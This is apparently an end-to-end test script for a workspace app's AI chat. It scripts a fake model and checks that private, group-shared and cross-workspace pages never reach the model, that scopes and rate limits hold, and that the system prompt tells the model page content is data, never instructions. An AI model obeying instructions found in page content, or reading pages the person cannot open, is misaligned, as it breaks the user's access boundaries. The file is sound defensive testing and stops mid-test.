/**
 * End-to-end check of the AI chat (#41) against the database, with a fake OpenAI-compatible server
 * (src/server/ai/fake-openai.ts) for the model and for embeddings, reached over HTTP like a real
 * provider, and scripted per test: the question's search, the model's search_pages and read_page
 * calls, the streamed answer and its citations; conversations (kept, continued with their history,
 * listed, shown, deleted, only ever to their owner, gone when the person leaves the workspace);
 * stopping an answer; the turns of a model without a price, input and rate limits and a failing provider; the page
 * and teamspace scopes (kept with each question); the workspace switch and a server without AI; and access, checked on every tool call: a
 * private page shared with nobody, a private teamspace, a page shared with a group, a guest, another
 * workspace, and a page whose access is taken back between two questions. Also the model picked
 * (sent, kept with the conversation, counted in usage by model and person), files attached to a
 * question (their text in the prompt, images only to models that take them, only their owner may
 * open or attach them, deleted with the conversation), research mode (read-only tools, a plan, a
 * report saved as a page) and web search against a stand-in SearXNG server (the workspace's switch,
 * results as cited sources, a loopback page refused, changes asked about after reading the web), and
 * media of another site the chat writes into a page written as links.
 * Creates its own users and workspaces and deletes them afterwards.
 *
 *   pnpm tsx scripts/ai-chat-e2e.ts
 *
 * Env: DATABASE_URL (read from .env when present). Migrations must be applied.
 */
export {};

try {
  process.loadEnvFile();
} catch {}

// Imported after .env is loaded: the database client reads DATABASE_URL when it is created.
const { and, eq, inArray } = await import("drizzle-orm");
const { db } = await import("@/db");
const { aiConversation, page, teamspace, user, workspace, workspaceMember } = await import("@/db/schema");
const { registerCollab } = await import("@/server/collab/bridge");
const { createCollab } = await import("@/server/collab/service");
const { createPage } = await import("@/server/pages");
const { addProperty } = await import("@/server/databases");
const { removePagePermission, setPageGroupPermission, setPagePermission } = await import("@/server/permissions");
const { createGroup } = await import("@/server/groups");
const { createTeamspace, joinTeamspace } = await import("@/server/teamspaces");
const { removeMember, updateWorkspaceSettings } = await import("@/server/workspaces");
const { AccessError } = await import("@/server/access");
const { isAiError, promptRoomFor, RUN_ROUNDS } = await import("@/server/ai");
const { resetAi, setAiEnv } = await import("@/server/ai/testing");
const { startFakeOpenAi, textOf } = await import("@/server/ai/fake-openai");
type FakeChatRequest = import("@/server/ai/fake-openai").FakeChatRequest;
type FakeReply = import("@/server/ai/fake-openai").FakeReply;
const index = await import("@/server/semantic-index");
const { deleteConversations, getConversation, listConversations, startChat } = await import("@/server/ai-chat");
const { setMemoryUse } = await import("@/server/ai-memory");
const { decideChange } = await import("@/server/ai-chat-approvals");
const { decidePageReview, getPageReview } = await import("@/server/page-review");
type ChatEvent = import("@/lib/ai-chat").ChatEvent;
type ChatStepView = import("@/lib/ai-chat").ChatStepView;
type ChatInput = import("@/server/ai-chat").ChatInput;

const RUN = `aichat-e2e-${Date.now().toString(36)}`;

const { hocuspocus, service } = createCollab();
registerCollab(service);
const fake = await startFakeOpenAi();

const AI = {
  AI_PROVIDER: "openai-compatible",
  AI_MODEL: "fake-chat",
  AI_BASE_URL: fake.baseUrl,
  AI_EMBEDDINGS_MODEL: "fake-embed",
  AI_EMBEDDINGS_BASE_URL: fake.baseUrl,
  AI_EMBEDDINGS_API_KEY: "local-test",
  AI_EMBEDDINGS_MIN_SIMILARITY: "0.25",
  AI_WORKSPACE_RATE_LIMIT: "1000",
  AI_RATE_LIMIT: "1000",
};
setAiEnv(AI);

let passed = 0;
function check(condition: unknown, label: string, detail?: unknown): asserts condition {
  if (!condition) {
    console.error(`FAIL  ${label}`);
    if (detail !== undefined) console.error(JSON.stringify(detail, null, 2));
    throw new Error(`Check failed: ${label}`);
  }
  passed++;
  console.log(`ok    ${label}`);
}

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

async function settle(timeoutMs = 30_000) {
  const until = Date.now() + timeoutMs;
  while (index.indexBusy()) {
    if (Date.now() > until) throw new Error("The index did not settle in time");
    await sleep(100);
  }
  await index.whenIndexIdle();
}

/** The AI error code `fn` throws before answering (or null). */
async function refusal(fn: () => Promise<unknown>): Promise<string | null> {
  try {
    await fn();
    return null;
  } catch (error) {
    return isAiError(error) ? error.code : `other: ${String(error)}`;
  }
}

type Source = { n: number; pageId: string; title: string; text: string };

/** The sources a request carries (the question's and the tool results'). */
function sourcesIn(request: FakeChatRequest): Source[] {
  const out: Source[] = [];
  for (const m of request.messages) {
    for (const s of textOf(m.content).matchAll(/<source n="(\d+)" page_id="([^"]+)" title="([^"]*)">\n([\s\S]*?)\n<\/source>/g)) {
      out.push({ n: Number(s[1]), pageId: s[2], title: s[3], text: s[4] });
    }
  }
  return out;
}

/** Everything a request sends to the model, as one string (for "never sent" checks). */
const everything = (request: FakeChatRequest) => request.messages.map((m) => textOf(m.content)).join("\n");
/** Tool results the model got in this request, newest last. */
const toolResults = (request: FakeChatRequest) => request.messages.filter((m) => m.role === "tool").map((m) => textOf(m.content));

/** A step as one line: `search:<query or ?>:<results>`, `read:<title or gone>`, `query:<database or gone>:<rules>:<rows>`, `plan:…`, `web-search:…`, `web-read:…`, `thought:<text>`. */
const stepLabel = (step: ChatStepView) =>
  step.kind === "search"
    ? `search:${step.query ?? "?"}:${step.results}`
    : step.kind === "read"
      ? `read:${step.page?.title ?? "gone"}`
      : step.kind === "query"
        ? `query:${step.database?.title ?? "gone"}:${step.conditions.map((c) => `${c.property} ${c.op} ${c.value ?? ""}`.trim()).join(",")}:${step.results}`
        : step.kind === "write"
          ? `write:${step.action}:${step.outcome}:${step.page?.title ?? step.title ?? step.target?.title ?? "?"}`
          : step.kind === "connection"
            ? `connection:${step.connection}:${step.tool}:${step.outcome}`
            : step.kind === "plan"
              ? `plan:${step.questions.join("|")}`
              : step.kind === "web"
                ? step.action === "search"
                  ? `web-search:${step.query}:${step.results}`
                  : `web-read:${step.url}:${step.outcome}`
                : `thought:${step.text}`;

/** Runs a question to the end; returns its events and what they add up to. */
async function ask(userId: string, input: ChatInput, options: { signal?: AbortSignal; onEvent?: (e: ChatEvent) => void | Promise<void> } = {}) {
  const events: ChatEvent[] = [];
  let text = "";
  for await (const event of await startChat(userId, input, options.signal)) {
    events.push(event);
    if (event.type === "text") text += event.text;
    if (event.type === "reset") text = "";
    await options.onEvent?.(event);
  }
  const conversation = events.find((e) => e.type === "conversation");
  const sources = events.find((e) => e.type === "sources");
  const end = events[events.length - 1];
  return {
    events,
    text,
    conversationId: conversation?.type === "conversation" ? conversation.id : null,
    sources: sources?.type === "sources" ? sources.sources : [],
    error: end?.type === "error" ? end.code : null,
    done: end?.type === "done",
    steps: events.flatMap((e) => (e.type === "step" ? [stepLabel(e.step)] : [])),
    ms: end?.type === "done" ? end.ms : null,
  };
}

/** The question of a request, and the workspace map that came with it. */
const questionOf = (request: FakeChatRequest) => /<question>\n([\s\S]*?)\n<\/question>/.exec(everything(request))?.[1] ?? "";
const mapOf = (request: FakeChatRequest) => /<workspace>\n([\s\S]*?)\n<\/workspace>/.exec(textOf(request.messages.at(-1)?.content ?? ""))?.[1] ?? "";

/**
 * A model that searches (for `search`, or the question), then reads `readId` (when given), then
 * answers citing what it read (or the first source), mentioning what each tool result said.
 */
function researcher({ search, readId }: { search?: string; readId?: string }) {
  return (request: FakeChatRequest): FakeReply => {
    const results = toolResults(request);
    const calls = request.messages.filter((m) => m.role === "assistant" && m.tool_calls?.length).length;
    if (calls === 0) return { text: "Let me look. ", toolCalls: [{ name: "search_pages", arguments: { query: search ?? questionOf(request) } }] };
    if (readId && calls === 1) return { toolCalls: [{ name: "read_page", arguments: { page_id: readId } }] };
    const sources = sourcesIn(request);
    const read = readId ? sources.filter((s) => s.pageId === readId).at(-1) : undefined;
    const cite = read ?? sources[0];
    const refused = results.some((r) => r.startsWith("No page with that id"));
    return { text: cite ? `${refused ? "I could not read that page. " : ""}The answer is in ${cite.title} [${cite.n}].` : "The workspace has nothing on it." };
  };
}

/** A model that makes these tool calls, one per turn, then answers citing the last source it got. */
function caller(calls: { name: string; arguments: Record<string, unknown> }[]) {
  return (request: FakeChatRequest): FakeReply => {
    const made = request.messages.filter((m) => m.role === "assistant" && m.tool_calls?.length).length;
    if (made < calls.length) return { toolCalls: [calls[made]] };
    const last = sourcesIn(request).at(-1);
    return { text: last ? `See ${last.title} [${last.n}].` : "Nothing." };
  };
}

const ids = {
  owner: `${RUN}-owner`,
  alice: `${RUN}-alice`,
  bob: `${RUN}-bob`,
  carol: `${RUN}-carol`,
  dave: `${RUN}-dave`,
  guest: `${RUN}-guest`,
  outsider: `${RUN}-outsider`,
};
const userIds = Object.values(ids);
const { owner, alice, bob, carol, dave, guest, outsider } = ids;
const workspaceId = `${RUN}-ws`;
const otherWs = `${RUN}-ws2`;

try {
  await db.insert(user).values(userIds.map((id) => ({ id, name: id, email: `${id}@example.test` })));
  await db.insert(workspace).values([
    { id: workspaceId, name: RUN },
    { id: otherWs, name: `${RUN} other` },
  ]);
  await db.insert(workspaceMember).values([
    { workspaceId, userId: owner, role: "owner" },
    { workspaceId, userId: alice, role: "member" },
    { workspaceId, userId: bob, role: "member" },
    { workspaceId, userId: carol, role: "member" },
    { workspaceId, userId: dave, role: "member" },
    { workspaceId, userId: guest, role: "guest" },
    { workspaceId: otherWs, userId: outsider, role: "owner" },
  ]);
  const [general] = await db.select({ id: teamspace.id }).from(teamspace).where(eq(teamspace.workspaceId, workspaceId));
  const actor = { userId: owner };
  const fleet = await createPage(actor, { workspaceId, teamspaceId: general.id, title: "Fleet notes", markdown: "Our car needs new tyres before winter." });
  const vendors = await createPage(actor, { workspaceId, parentId: fleet.id, title: "Tyre vendors", markdown: "Vehicle tyre suppliers: Northwind Tyres." });
  const office = await createPage(actor, { workspaceId, teamspaceId: general.id, title: "Office rules", markdown: "Puppies are welcome on Fridays." });
  const diary = await createPage(actor, { workspaceId, teamspaceId: null, title: "Owner diary", markdown: "SECRET-DIARY: I will buy a new automobile." });
  const secretSpace = await createTeamspace(owner, workspaceId, { name: `${RUN} secret`, access: "private" });
  const roadmap = await createPage(actor, { workspaceId, teamspaceId: secretSpace.id, title: "Hidden roadmap", markdown: "SECRET-ROADMAP: vehicle plans for next year." });
  const travel = await createPage(actor, { workspaceId, teamspaceId: null, title: "Travel desk", markdown: "SECRET-TRAVEL: vacation requests go to Jo." });
  const travellers = await createGroup(owner, workspaceId, "Travellers", [bob]);
  await setPageGroupPermission(owner, travel.id, travellers.id, "view");
  const guestBook = await createPage(actor, { workspaceId, teamspaceId: general.id, title: "Guest handbook", markdown: "Holiday calendar for guests." });
  await setPagePermission(owner, guestBook.id, guest, "view");
  const lent = await createPage(actor, { workspaceId, teamspaceId: null, title: "Lent budget", markdown: "SECRET-LENT: the vehicle budget is 40k." });
  await setPagePermission(owner, lent.id, alice, "view");
  const theirs = await createPage({ userId: outsider }, { workspaceId: otherWs, title: "Their car", markdown: "SECRET-OTHER: automobile repairs." });
  await settle();
  const secrets = ["SECRET-DIARY", "SECRET-ROADMAP", "SECRET-OTHER"];

  // ── A question answered from the pages ──────────────────────────────────────────────────────
  fake.setChat(researcher({ search: "automobile", readId: vendors.id }));
  fake.chats.length = 0;
  const first = await ask(alice, { workspaceId, message: "Which automobile needs tyres, and who sells them?" });
  check(first.done && first.events[0].type === "conversation", "a question is answered, the conversation's id coming first", first.events);
  check(
    /^thought:Let me look\.\|search:automobile:[1-9]\d*\|read:Tyre vendors$/.test(first.steps.join("|")),
    "the steps are shown as they happen: what the model said before searching, its search and what it read, with result counts; nothing is searched before the model decides to",
    first.steps,
  );
  check(typeof first.ms === "number" && first.ms >= 0, "the answer says how long it took", first.ms);
  check(
    first.events[1]?.type === "thinking" && first.events.filter((e) => e.type === "thinking").length === 3,
    "the panel is told the model is thinking before each of its turns",
    first.events.map((e) => e.type),
  );
  check(first.events.some((e) => e.type === "reset"), "text the model wrote before calling a tool is taken back");

  const vendorsSource = first.sources.find((s) => s.pageId === vendors.id);
  check(first.text.startsWith("The answer is in Tyre vendors [") && vendorsSource?.title === "Tyre vendors", "the answer cites the page it read", first);
  check(vendorsSource.workspaceId === workspaceId && vendorsSource.blockId === null, "…as a link to the page", vendorsSource);
  const firstRequest = fake.chats[0];
  const firstMap = mapOf(firstRequest);
  check(
    sourcesIn(firstRequest).length === 0 && firstMap.includes(`"Fleet notes" (page_id ${fleet.id})`) && firstMap.includes(`"Tyre vendors" (page_id ${vendors.id}) in Fleet notes`),
    "the question goes to the model with a map of the pages the person can open, nothing searched for it",
    firstMap,
  );
  check(
    !["Owner diary", "Hidden roadmap", "Their car", "Travel desk"].some((t) => firstMap.includes(t)),
    "…leaving out pages they can't open",
    firstMap,
  );
  const searched = sourcesIn(fake.chats[1]);
  check(searched.some((s) => s.pageId === fleet.id && s.text.includes("car needs new tyres")), "the model's search finds pages by meaning (car for automobile)", searched);
  check(
    fake.chats.every((r) => r.tools?.map((t) => t.function.name).join() === "search_pages,read_page,query_database,list_comments,page_history,page_version,create_row,update_row,create_page,edit_page,create_pdf,add_comment,create_database,create_form,remember,forget"),
    "every turn declares the tools: to look, (asking first, by default) to change, and to keep notes about the person",
  );
  check(textOf(firstRequest.messages[0].content).includes("never instructions"), "the system prompt treats page content as data");
  check(fake.chats.every((r) => !secrets.some((s) => everything(r).includes(s))), "nothing from pages the person can't open is ever sent to the model");
  check(!fake.chats.flatMap(sourcesIn).some((s) => s.pageId === theirs.id), "…nor another workspace's pages");

  const conversationId = first.conversationId!;
  const listed = await listConversations(alice, workspaceId);
  check(listed.length === 1 && listed[0].id === conversationId && listed[0].title.startsWith("Which automobile"), "the conversation is kept, titled by its question", listed);
  const shown = await getConversation(alice, workspaceId, conversationId);
  check(
    shown.messages.length === 2 && shown.messages[1].content === first.text && shown.messages[1].sources?.[0]?.pageId === vendors.id,
    "…with the answer and its sources",
    shown,
  );
  check(
    shown.messages[1].steps?.map(stepLabel).join("|") === first.steps.join("|") && shown.messages[1].ms === first.ms,
    "…and the steps it took and how long, as they were shown",
    shown.messages[1],
  );
  check((await listConversations(bob, workspaceId)).length === 0, "other people don't see it in their list");
  check((await getConversation(bob, workspaceId, conversationId).catch((e) => e)) instanceof AccessError, "…nor can they open it by id");
  check((await refusal(() => startChat(bob, { workspaceId, conversationId, message: "More?" }))) === "noAccess", "…or continue it");
  await deleteConversations(bob, workspaceId, [conversationId]);
  check((await listConversations(alice, workspaceId)).length === 1, "…or delete it");

  // The model's thinking streams as it comes, before its answer, and isn't kept.
  fake.setChat(() => ({ thinking: "Weighing which page answers this.", text: "Nothing on it here." }));
  const thought = await ask(alice, { workspaceId, message: "Is there a page about bicycles?" });
  const reasoning = thought.events.flatMap((e) => (e.type === "reasoning" ? [e.text] : [])).join("");
  check(thought.done && reasoning === "Weighing which page answers this.", "the model's thinking streams as reasoning events", thought.events);
  check(
    thought.events.findIndex((e) => e.type === "reasoning") < thought.events.findIndex((e) => e.type === "text") && thought.text === "Nothing on it here.",
    "…before the answer, and apart from it",
    thought.events.map((e) => e.type),
  );
  const thoughtShown = await getConversation(alice, workspaceId, thought.conversationId!);
  check(!JSON.stringify(thoughtShown.messages).includes("Weighing"), "…and isn't kept in the conversation", thoughtShown.messages);
  await deleteConversations(alice, workspaceId, [thought.conversationId!]);


  // A follow-up carries the earlier turn, without its citation numbers.
  fake.setChat(researcher({}));
  fake.chats.length = 0;
  const followUp = await ask(alice, { workspaceId, conversationId, message: "And the office rules?" });
  check(followUp.done && followUp.conversationId === conversationId, "a follow-up continues the conversation");
  const history = fake.chats[0].messages.filter((m) => m.role !== "system").map((m) => `${m.role}:${textOf(m.content).slice(0, 40)}`);
  check(
    history[0] === "user:Which automobile needs tyres, and who se" && history[1] === "assistant:The answer is in Tyre vendors." && history.length === 3,
    "…with the earlier question and answer sent back (citations left out)",
    history,
  );
  check((await getConversation(alice, workspaceId, conversationId)).messages.length === 4, "…and both turns kept");

  // ── Access on every tool call ───────────────────────────────────────────────────────────────
  for (const [who, target, label] of [
    [alice, diary.id, "a private page shared with nobody"],
    [alice, roadmap.id, "a private teamspace's page"],
    [carol, travel.id, "a page shared with a group they're not in"],
    [guest, fleet.id, "a page not shared with the guest"],
    [alice, theirs.id, "another workspace's page"],
    [alice, "not-a-page", "a made-up id"],
  ] as const) {
    fake.setChat(researcher({ readId: target }));
    fake.chats.length = 0;
    const run = await ask(who, { workspaceId, message: "Tell me about automobile plans and vacation" });
    const results = fake.chats.flatMap(toolResults);
    check(
      run.done && results.some((r) => r.startsWith("No page with that id can be read")) && !run.steps.some((t) => t.startsWith("read:")),
      `read_page refuses ${label}`,
      { results, steps: run.steps },
    );
    check(
      !run.sources.some((s) => s.pageId === target) && fake.chats.every((r) => !secrets.concat(who === carol ? ["SECRET-TRAVEL"] : []).some((s) => everything(r).includes(s))),
      "…and nothing of it reaches the model or the citations",
    );
  }
  fake.setChat(researcher({ readId: travel.id }));
  fake.chats.length = 0;
  const bobRead = await ask(bob, { workspaceId, message: "Where do vacation requests go?" });
  check(bobRead.sources.some((s) => s.pageId === travel.id) && fake.chats.some((r) => everything(r).includes("SECRET-TRAVEL")), "a group member can have the group's page read and cited");
  fake.setChat(researcher({}));
  fake.chats.length = 0;
  const guestRun = await ask(guest, { workspaceId, message: "When is the holiday calendar? Also automobile tyres." });
  const guestSources = fake.chats.flatMap(sourcesIn).map((s) => s.pageId);
  check(guestRun.done && guestSources.includes(guestBook.id) && guestSources.every((id) => id === guestBook.id), "a guest's questions are answered only from pages shared with them", guestSources);
  const guestMap = mapOf(fake.chats[0]);
  check(guestMap.includes("Guest handbook") && !guestMap.includes("Fleet notes"), "…and their map lists only those", guestMap);

  // Access taken back between two questions.
  fake.setChat(researcher({ readId: lent.id }));
  const lentRun = await ask(alice, { workspaceId, message: "What is the vehicle budget?" });
  check(lentRun.sources.some((s) => s.pageId === lent.id && s.title === "Lent budget"), "a page shared with someone is read and cited");
  await removePagePermission(owner, lent.id, alice);
  const lentShown = await getConversation(alice, workspaceId, lentRun.conversationId!);
  const lentSource = lentShown.messages[1].sources?.[0];
  check(lentSource?.pageId === null && lentSource.title === null, "once access is taken back, the old citation no longer names the page", lentSource);
  check(
    lentRun.steps.includes("read:Lent budget") && lentShown.messages[1].steps?.some((st) => st.kind === "read" && st.page === null),
    "…nor does the step that read it",
    lentShown.messages[1].steps,
  );
  fake.chats.length = 0;
  const lentAgain = await ask(alice, { workspaceId, conversationId: lentRun.conversationId, message: "Read it again, please." });
  check(
    fake.chats.flatMap(toolResults).some((r) => r.startsWith("No page with that id can be read")) && !lentAgain.sources.some((s) => s.pageId === lent.id),
    "…and it can't be read again in the same conversation",
  );
  check(fake.chats.every((r) => !everything(r).includes("SECRET-LENT")), "…nor its text found by search any more");

  // ── Scope ───────────────────────────────────────────────────────────────────────────────────
  fake.setChat(researcher({ search: "automobile", readId: office.id }));
  fake.chats.length = 0;
  const scoped = await ask(alice, { workspaceId, message: "What do we know about the automobile?", scope: { pageId: fleet.id } });
  const scopedSources = fake.chats.flatMap(sourcesIn).map((s) => s.pageId);
  check(scoped.done && scopedSources.length > 0 && scopedSources.every((id) => id === fleet.id || id === vendors.id), "a question about a page searches only it and its subpages", scopedSources);
  check(fake.chats.flatMap(toolResults).some((r) => r.startsWith("No page with that id")), "…and read_page refuses pages outside it");
  check(textOf(fake.chats[0].messages[0].content).includes('Only the page "Fleet notes"'), "…the model is told the scope");
  const scopedMap = mapOf(fake.chats[0]);
  check(scopedMap.includes("Fleet notes") && scopedMap.includes("Tyre vendors") && !scopedMap.includes("Office rules"), "…and its map lists only the pages in it", scopedMap);
  check((await refusal(() => startChat(alice, { workspaceId, message: "x?", scope: { pageId: diary.id } }))) === "noAccess", "a page the person can't open can't be the scope");
  check((await refusal(() => startChat(outsider, { workspaceId: otherWs, message: "x?", scope: { pageId: fleet.id } }))) === "noAccess", "…nor another workspace's page");
  const scopedShown = await getConversation(alice, workspaceId, scoped.conversationId!);
  check(
    JSON.stringify(scopedShown.messages[0].scope) === JSON.stringify({ kind: "page", id: fleet.id, title: "Fleet notes" }) && !scopedShown.messages[1].scope,
    "the question shows the page it was asked of",
    scopedShown.messages[0],
  );

  // A teamspace as the scope: only its pages are searched, read and listed.
  const workshop = await createTeamspace(owner, workspaceId, { name: `${RUN} workshop`, access: "open" });
  await joinTeamspace(alice, workshop.id);
  const liftLog = await createPage(actor, { workspaceId, teamspaceId: workshop.id, title: "Lift log", markdown: "The automobile lift was serviced in March." });
  const liftParts = await createPage(actor, { workspaceId, parentId: liftLog.id, title: "Lift parts", markdown: "Spare automobile lift cables." });
  await settle();
  fake.setChat(researcher({ search: "automobile", readId: fleet.id }));
  fake.chats.length = 0;
  const inTeamspace = await ask(alice, { workspaceId, message: "What do we know about the automobile?", scope: { teamspaceId: workshop.id } });
  const teamspaceSources = fake.chats.flatMap(sourcesIn).map((s) => s.pageId);
  check(
    inTeamspace.done && teamspaceSources.length > 0 && teamspaceSources.every((id) => id === liftLog.id || id === liftParts.id),
    "a question about a teamspace searches only its pages",
    teamspaceSources,
  );
  check(fake.chats.flatMap(toolResults).some((r) => r.startsWith("No page with that id")), "…and read_page refuses pages outside it");
  check(textOf(fake.chats[0].messages[0].content).includes(`Only the pages of the teamspace "${RUN} workshop" are in scope.`), "…the model is told the scope");
  const teamspaceMap = mapOf(fake.chats[0]);
  check(teamspaceMap.includes("Lift log") && teamspaceMap.includes("Lift parts") && !teamspaceMap.includes("Fleet notes"), "…and its map lists only the teamspace's pages", teamspaceMap);
  const scopeEvent = inTeamspace.events[0];
  check(
    scopeEvent.type === "conversation" && JSON.stringify(scopeEvent.scope) === JSON.stringify({ kind: "teamspace", id: workshop.id, title: `${RUN} workshop` }),
    "…the panel is told the scope it answers from",
    scopeEvent,
  );
  const teamspaceShown = await getConversation(alice, workspaceId, inTeamspace.conversationId!);
  check(teamspaceShown.messages[0].scope?.title === `${RUN} workshop`, "…and the question shows it", teamspaceShown.messages[0]);
  check((await refusal(() => startChat(alice, { workspaceId, message: "x?", scope: { teamspaceId: secretSpace.id } }))) === "noAccess", "a private teamspace the person isn't in can't be the scope");
  check((await refusal(() => startChat(outsider, { workspaceId: otherWs, message: "x?", scope: { teamspaceId: workshop.id } }))) === "noAccess", "…nor another workspace's teamspace");
  check((await refusal(() => startChat(guest, { workspaceId, message: "x?", scope: { teamspaceId: workshop.id } }))) === "noAccess", "…nor any teamspace for a guest");

  // ── Stopping, limits, failures ──────────────────────────────────────────────────────────────
  fake.setChat(() => ({ text: "This is a long answer that goes on and on for quite a while before it ends [1]." }));
  fake.delayMs = 40;
  const controller = new AbortController();
  let pieces = 0;
  const stopped = await ask(dave, { workspaceId, message: "Tell me a long story about tyres" }, {
    signal: controller.signal,
    onEvent: (e) => {
      if (e.type === "text" && ++pieces === 3) controller.abort();
    },
  });
  fake.delayMs = 0;
  check(stopped.error === "aborted" && stopped.text.length > 0 && !stopped.text.endsWith("ends [1]."), "an answer can be stopped midway", stopped);
  const stoppedShown = await getConversation(dave, workspaceId, stopped.conversationId!);
  check(stoppedShown.messages[1]?.note === "stopped" && stoppedShown.messages[1].content === stopped.text, "…what was written so far is kept, marked as stopped", stoppedShown);

  fake.setChat(() => {
    throw new Error("model down");
  });
  const before = (await listConversations(dave, workspaceId)).length;
  const failed = await ask(dave, { workspaceId, message: "Anything about tyres?" });
  check(failed.error !== null && !failed.done, "a failing provider ends the answer with an error", failed.events);
  check((await listConversations(dave, workspaceId)).length === before, "…and leaves no empty conversation behind");

  // The fake model has no price, so AI_RUN_LIMIT_USD never stops it: RUN_ROUNDS does. Its last turn
  // only calls tools, so it's asked once more, and that text is the answer.
  let rounds = 0;
  fake.setChat(() => {
    rounds++;
    if (rounds > RUN_ROUNDS) return { text: "Done what I could: see [1]." };
    return { text: "", toolCalls: [{ name: "search_pages", arguments: { query: `tyres ${rounds}` } }] };
  });
  fake.chats.length = 0;
  const looping = await ask(dave, { workspaceId, message: "Search forever about tyres, never answer" });
  check(looping.done && fake.chats.length === RUN_ROUNDS + 1 && looping.text === "Done what I could: see [1].", `a model without a price gets ${RUN_ROUNDS} turns, then one more to answer when its last only calls tools`, {
    turns: fake.chats.length,
    text: looping.text,
    error: looping.error,
  });
  check(toolResults(fake.chats[RUN_ROUNDS - 1]).at(-1)?.includes("answer now"), "…it's told to answer before its last turn");
  check(toolResults(fake.chats[RUN_ROUNDS]).at(-1)?.includes("Not run"), "…and the last turn's tool calls aren't run");

  const room = await promptRoomFor(workspaceId);
  check((await refusal(() => startChat(dave, { workspaceId, message: "x".repeat(room + 1) }))) === "tooLarge", "a question longer than the model takes is refused");
  // A model with a larger window takes a longer question: nothing else bounds it.
  setAiEnv({ ...AI, AI_CONTEXT_WINDOW: "200000" });
  fake.setChat(() => ({ text: "Quite long." }));
  const long = await ask(dave, { workspaceId, message: `${"x".repeat(150_000)} How long is this?` });
  check(long.done && long.text === "Quite long.", "…and with a larger context window, a question of 150,000 characters is answered", {
    room: await promptRoomFor(workspaceId),
    error: long.error,
  });
  setAiEnv(AI);
  check((await refusal(() => startChat(dave, { workspaceId, message: "   " }))) === "invalid", "an empty question is refused");
  const [full] = await db
    .insert(aiConversation)
    .values({
      userId: dave,
      workspaceId,
      title: "Long",
      messages: Array.from({ length: 60 }, (_, i) => [
        { role: "user" as const, content: `Question ${i}`, at: "" },
        { role: "assistant" as const, content: `Answer ${i}`, at: "" },
      ]).flat(),
    })
    .returning();
  // A model that finds the conversation too long: the chat asks again without the earlier turns.
  fake.setChat((request) => {
    if (request.messages.filter((m) => m.role === "user").length > 1) {
      throw Object.assign(new Error("This model's maximum context length is 32768 tokens. However, your messages resulted in 40000 tokens."), { status: 400 });
    }
    return { text: "Still here." };
  });
  fake.chats.length = 0;
  const longer = await ask(dave, { workspaceId, conversationId: full.id, message: "One more?" });
  check(longer.done && longer.text === "Still here.", "a long conversation takes more questions, without a turn limit", longer.error);
  check(
    fake.chats.length === 2 && fake.chats[0].messages.some((m) => textOf(m.content) === "Question 59") && !everything(fake.chats[1]).includes("Question 59"),
    "…and when the model finds it too long, the turn is asked again without the earlier conversation",
    fake.chats.map((c) => c.messages.length),
  );
  check((await getConversation(dave, workspaceId, full.id)).messages.length === 122, "…and the question and answer are kept with the rest");
  setAiEnv({ ...AI, AI_RATE_LIMIT: "2" });
  fake.setChat(researcher({}));
  const limited: (string | null)[] = [];
  for (let i = 0; i < 3; i++) limited.push(await refusal(async () => ask(carol, { workspaceId, message: `Tyres ${i}?` })));
  check(limited.join() === ",,rateLimited", "questions count against the person's AI rate limit", limited);
  setAiEnv(AI);

  check((await refusal(() => startChat(outsider, { workspaceId, message: "Tyres?" }))) === "noAccess", "people outside the workspace can't ask");
  check((await refusal(() => startChat(alice, { workspaceId, conversationId: full.id, message: "Mine?" }))) === "noAccess", "…nor anyone continue another person's conversation");

  // ── The switches ────────────────────────────────────────────────────────────────────────────
  await updateWorkspaceSettings(owner, workspaceId, { ai: false });
  check((await refusal(() => startChat(alice, { workspaceId, message: "Tyres?" }))) === "disabled", "with AI off for the workspace the chat is off");
  await updateWorkspaceSettings(owner, workspaceId, { ai: true });
  setAiEnv({ AI_EMBEDDINGS_MODEL: "fake-embed", AI_EMBEDDINGS_BASE_URL: fake.baseUrl, AI_EMBEDDINGS_API_KEY: "local-test" });
  check((await refusal(() => startChat(alice, { workspaceId, message: "Tyres?" }))) === "disabled", "with embeddings but no chat model the chat is off");
  setAiEnv({ AI_PROVIDER: AI.AI_PROVIDER, AI_MODEL: AI.AI_MODEL, AI_BASE_URL: AI.AI_BASE_URL });
  fake.setChat(researcher({}));
  fake.chats.length = 0;
  const textOnly = await ask(alice, { workspaceId, message: "tyres" });
  check(textOnly.done && fake.chats.flatMap(sourcesIn).some((s) => s.pageId === fleet.id), "without embeddings the chat answers from full-text search");
  fake.chats.length = 0;
  const whole = await ask(alice, { workspaceId, message: "Which tyres does our car need before winter?" });
  check(
    whole.done && fake.chats.flatMap(sourcesIn).some((s) => s.pageId === fleet.id),
    "…also for a whole question, whose words needn't all be on the page (\"need\" finds \"needs\")",
  );
  // Without an index the model still gets the part of a long page that matched, not its first line.
  const filler = Array.from({ length: 12 }, (_, i) => `Paragraph ${i} is about the office kitchen, its kettle and the weekly cleaning rota.`).join("\n\n");
  const manual = await createPage(actor, {
    workspaceId,
    teamspaceId: general.id,
    title: "Garage manual",
    markdown: `${filler}\n\nWinter pressure for the van: check it every Monday morning before the first delivery round leaves the yard, with the gauge that hangs next to the compressor, and write the result in the log book; the value to aim for is 2.4 bar.\n\n${filler}`,
  });
  fake.setChat(researcher({ search: "winter pressure van" }));
  fake.chats.length = 0;
  const deep = await ask(alice, { workspaceId, message: "What pressure for the van in winter?" });
  const manualSource = fake.chats.flatMap(sourcesIn).find((s) => s.pageId === manual.id);
  check(
    deep.done && manualSource?.text.includes("2.4 bar") && !manualSource.text.startsWith("Paragraph 0"),
    "without embeddings a search result brings the passage around its words",
    manualSource,
  );
  fake.setChat(researcher({}));
  const parts = await createPage(actor, { workspaceId, teamspaceId: general.id, kind: "database", title: "Spare parts" });
  const stock = await addProperty(owner, parts.id, { name: "Stock", type: "select", options: ["Ordered", "In stock"] });
  const winter = await createPage(actor, { workspaceId, parentId: parts.id, title: "Winter tyres", properties: { [stock.id]: stock.options.options![0].id } });
  fake.setChat(researcher({}));
  fake.chats.length = 0;
  const rowHit = await ask(alice, { workspaceId, message: "Are the winter tyres here yet?" });
  const rowSource = fake.chats.flatMap(sourcesIn).find((s) => s.pageId === winter.id);
  const partsMap = mapOf(fake.chats[0]);
  check(
    partsMap.includes(`"Spare parts" (database_id ${parts.id})`) && partsMap.includes("  - Stock (select; options: Ordered, In stock)") && !partsMap.includes(winter.id),
    "the map lists databases with their properties and options (to query them), not their rows",
    partsMap,
  );
  await addProperty(owner, parts.id, { name: "Fitting", type: "status" });
  fake.chats.length = 0;
  await ask(alice, { workspaceId, message: "Which parts are being fitted?" });
